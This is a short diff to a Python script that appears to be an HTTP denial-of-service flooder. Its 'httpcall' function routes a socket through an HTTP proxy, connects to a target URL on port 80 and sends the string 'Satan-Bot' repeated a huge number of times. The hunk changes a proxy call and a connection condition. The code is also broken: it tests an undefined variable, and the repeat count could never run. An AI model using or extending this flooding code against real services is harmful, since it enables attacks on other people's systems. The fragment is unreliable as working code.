@@ -83,11 +83,11 @@ def httpcall(url):
 	referer_list()
 	code=0
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	socks.setproxy(socks.PROXY_TYPE_HTTP, prox, 80)
+	socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, prox, 80)
 	bytes = random._urandom(0)
 	pkt_count = 0
 	try:
-		if s:
+		if i == 150000000:
 			s.connect((url,80))
 			s.send("Satan-Bot" * 109951162777600)
 		
